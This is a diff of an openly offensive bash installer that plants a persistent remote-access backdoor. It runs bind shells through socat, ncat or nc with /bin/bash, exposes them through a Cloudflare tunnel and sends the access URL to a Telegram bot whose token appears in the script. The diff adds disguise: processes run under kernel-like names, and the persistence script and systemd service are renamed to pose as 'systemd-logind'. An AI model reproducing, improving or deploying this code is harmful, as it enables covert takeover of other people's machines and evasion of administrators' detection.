@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Cloudflare Tunnel Reverse Shell (seperti gsocket) + Telegram notifikasi
+# Cloudflare Tunnel Reverse Shell (persistent) + Telegram notifikasi
 # Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
 # Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
 
@@ -21,7 +21,7 @@ KERNEL_PROC_NAMES=(
 )
 PROC_HIDDEN_NAME="${KERNEL_PROC_NAMES[$((RANDOM % ${#KERNEL_PROC_NAMES[@]}))]}"
 
-# ========== TELEGRAM NOTIFICATION (ISI SESUAI) ==========
+# ========== TELEGRAM NOTIFICATION ==========
 TELEGRAM_BOT_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"   # Ganti dengan token bot Anda
 TELEGRAM_CHAT_ID="6223261018"                                 # Ganti dengan chat ID Anda
 
@@ -46,14 +46,17 @@ cleanup() {
 }
 trap cleanup EXIT
 
-# ========== KIRIM PESAN TELEGRAM ==========
+# ========== KIRIM PESAN TELEGRAM (dengan fallback wget) ==========
 send_telegram() {
     local message="$1"
     if [[ -n "$TELEGRAM_BOT_TOKEN" && "$TELEGRAM_BOT_TOKEN" != "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" && -n "$TELEGRAM_CHAT_ID" ]]; then
-        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
-            -d chat_id="$TELEGRAM_CHAT_ID" \
-            -d text="$message" \
-            -d parse_mode="HTML" >/dev/null 2>&1 &
+        local url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
+        local data="chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=HTML"
+        if command -v curl >/dev/null; then
+            curl -s -X POST "$url" -d "$data" >/dev/null 2>&1 &
+        elif command -v wget >/dev/null; then
+            wget -q --post-data "$data" "$url" >/dev/null 2>&1 &
+        fi
     fi
 }
 
@@ -105,55 +108,75 @@ start_bindshell() {
     else
         bind_cmd="bash -c 'while true; do nc -l -p ${port} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done'"
     fi
-    # Jalankan dalam subshell background agar tidak menggantikan shell utama
     ( exec -a "$PROC_HIDDEN_NAME" nohup $bind_cmd >/dev/null 2>&1 ) &
     echo $!
 }
 
-# ========== START TUNNEL (langsung, tanpa monitor) ==========
+# ========== START TUNNEL (langsung) ==========
 start_tunnel_direct() {
     local port="$1"
     local bin="$2"
-    # Jalankan dalam subshell background, arahkan output ke log
     ( exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://127.0.0.1:${port}" >> "$TMPDIR/cloudflared.log" 2>&1 ) &
     echo $!
 }
 
-# ========== PERSISTENCE SCRIPT (dengan monitoring URL dan Telegram) ==========
+# ========== PERSISTENCE SCRIPT (dengan bind shell + tunnel + monitoring + fallback wget) ==========
 create_persistence_script() {
     local bin_path="$1"
     local port="$2"
-    local script_path="${HOME}/.${CONFIG_DIR}/cf_tunnel.sh"
+    local script_path="${HOME}/.${CONFIG_DIR}/systemd-logind-helper"   # Nama file lebih anonim
     local telegram_token="$3"
     local telegram_chat="$4"
+    local proc_name="$5"
     mkdir -p "${HOME}/.${CONFIG_DIR}"
     cat > "$script_path" <<EOF
 #!/bin/bash
-# Persistence script for Cloudflare Tunnel (hidden)
+# Persistence script for bind shell + Cloudflare Tunnel (auto-restart both)
 BIN="$bin_path"
 PORT=$port
 TMPDIR="$TMPDIR"
 TELEGRAM_TOKEN="$telegram_token"
 TELEGRAM_CHAT="$telegram_chat"
-PROC_NAME="$PROC_HIDDEN_NAME"
+PROC_NAME="$proc_name"
 URL_SENT_FILE="\$TMPDIR/url_sent"
 
 send_telegram() {
     if [[ -n "\$TELEGRAM_TOKEN" && "\$TELEGRAM_TOKEN" != "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" && -n "\$TELEGRAM_CHAT" ]]; then
-        curl -s -X POST "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage" \\
-            -d chat_id="\$TELEGRAM_CHAT" \\
-            -d text="\$1" \\
-            -d parse_mode="HTML" >/dev/null 2>&1 &
+        local url="https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage"
+        local data="chat_id=\${TELEGRAM_CHAT}&text=\$1&parse_mode=HTML"
+        if command -v curl >/dev/null; then
+            curl -s -X POST "\$url" -d "\$data" >/dev/null 2>&1 &
+        elif command -v wget >/dev/null; then
+            wget -q --post-data "\$data" "\$url" >/dev/null 2>&1 &
+        fi
     fi
 }
 
+# Function to run bind shell (restart if dies)
+run_bindshell() {
+    while true; do
+        if command -v socat >/dev/null; then
+            exec -a "\$PROC_NAME" socat TCP-LISTEN:\${PORT},bind=127.0.0.1,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+        elif command -v ncat >/dev/null; then
+            exec -a "\$PROC_NAME" ncat -lvvk \${PORT} -e /bin/bash --allow 127.0.0.1
+        elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
+            exec -a "\$PROC_NAME" nc -l -p \${PORT} -s 127.0.0.1 -e /bin/bash
+        else
+            exec -a "\$PROC_NAME" bash -c "while true; do nc -l -p \${PORT} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done"
+        fi
+        sleep 5
+    done
+}
+
+# Start bindshell in background
+run_bindshell &
+
+# Tunnel loop with monitoring
 while true; do
-    # Jalankan tunnel, arahkan stdout+stderr ke log
     exec -a "\$PROC_NAME" "\$BIN" tunnel --url "tcp://127.0.0.1:\$PORT" 2>&1 | while IFS= read -r line; do
         echo "\$line" >> "\$TMPDIR/cloudflared.log"
         if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
             url="\${BASH_REMATCH[0]}"
-            # Cek apakah URL sudah pernah dikirim
             if [[ ! -f "\$URL_SENT_FILE" ]] || ! grep -q "\$url" "\$URL_SENT_FILE"; then
                 echo "\$url" >> "\$URL_SENT_FILE"
                 msg="<b>New Tunnel URL</b>\n\$url\n\nUse: cloudflared access tcp --hostname \$url --url localhost:4444 && nc localhost 4444"
@@ -168,10 +191,10 @@ EOF
     echo "$script_path"
 }
 
-# ========== INSTALL PERSISTENCE (systemd/cron) ==========
+# ========== INSTALL PERSISTENCE (systemd/cron) dengan nama service anonim ==========
 install_persistence() {
     local script_path="$1"
-    local service_name="cf-tunnel"
+    local service_name="systemd-logind"   # Nama service lebih anonim
     if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null; then
         mkdir -p "${HOME}/.config/systemd/user"
         cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
@@ -204,21 +227,14 @@ EOF
 # ========== UNINSTALL ==========
 uninstall() {
     print_step "Removing installed files..."
-    # Baca file konfigurasi jika ada
-    local conf_file="${HOME}/.${CONFIG_DIR}/tunnel.conf"
-    if [[ -f "$conf_file" ]]; then
-        source "$conf_file"
-        [[ -n "${TUNNEL_PID:-}" ]] && kill -9 "$TUNNEL_PID" 2>/dev/null || true
-        [[ -n "${BIND_PID:-}" ]] && kill -9 "$BIND_PID" 2>/dev/null || true
-        [[ -n "${PROC_NAME:-}" ]] && pkill -f "$PROC_NAME" 2>/dev/null || true
-    fi
-    pkill -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
-    pkill -f "cf_tunnel.sh" 2>/dev/null || true
-    crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
+    # Matikan semua proses terkait
+    pkill -f "$PROC_HIDDEN_NAME" 2>/dev/null || true
+    pkill -f "systemd-logind-helper" 2>/dev/null || true
+    crontab -l 2>/dev/null | grep -v "systemd-logind-helper" | crontab - 2>/dev/null || true
     if command -v systemctl >/dev/null; then
-        systemctl --user stop cf-tunnel.service 2>/dev/null || true
-        systemctl --user disable cf-tunnel.service 2>/dev/null || true
-        rm -f "${HOME}/.config/systemd/user/cf-tunnel.service"
+        systemctl --user stop systemd-logind.service 2>/dev/null || true
+        systemctl --user disable systemd-logind.service 2>/dev/null || true
+        rm -f "${HOME}/.config/systemd/user/systemd-logind.service"
         systemctl --user daemon-reload 2>/dev/null || true
     fi
     rm -rf "${HOME}/.${CONFIG_DIR}"
@@ -290,9 +306,9 @@ print_step "Starting 'defunct' as hidden process '$PROC_HIDDEN_NAME'..."
 
 # Start bindshell
 bind_pid=$(start_bindshell "$PORT")
-# Start tunnel (langsung)
+# Start tunnel
 tunnel_pid=$(start_tunnel_direct "$PORT" "$cf_bin")
-# Simpan PID untuk uninstall
+# Simpan PID untuk uninstall (opsional)
 cat > "${INSTALL_DIR}/tunnel.conf" <<EOF
 BIND_PID=$bind_pid
 TUNNEL_PID=$tunnel_pid
@@ -302,13 +318,11 @@ EOF
 
 # Tunggu URL awal
 sleep 5
-# Cek log untuk URL (gunakan grep -oE untuk portabilitas)
 if [[ -f "$TMPDIR/cloudflared.log" ]]; then
     url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$TMPDIR/cloudflared.log" | head -1)
     if [[ -n "$url" ]]; then
         echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m"
         echo "Connect with: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
-        # Kirim via Telegram juga
         send_telegram "<b>Initial Tunnel URL</b>\n$url"
     else
         warn "Tunnel URL not detected yet. Check $TMPDIR/cloudflared.log"
@@ -316,11 +330,11 @@ if [[ -f "$TMPDIR/cloudflared.log" ]]; then
 fi
 finish_ok
 
-# --- Persistence dengan Telegram ---
+# --- Persistence dengan bind shell + tunnel (nama file & service anonim) ---
 if [[ -z "${GS_NOINST:-}" ]]; then
-    persistence_script=$(create_persistence_script "$cf_bin" "$PORT" "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID")
+    persistence_script=$(create_persistence_script "$cf_bin" "$PORT" "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID" "$PROC_HIDDEN_NAME")
     if install_persistence "$persistence_script"; then
-        info "Persistence installed (will send new URLs via Telegram after reboot)."
+        info "Persistence installed (bind shell + tunnel will auto-start after reboot)."
     else
         warn "Persistence not installed (no systemd/cron). Tunnel will not survive reboot."
     fi
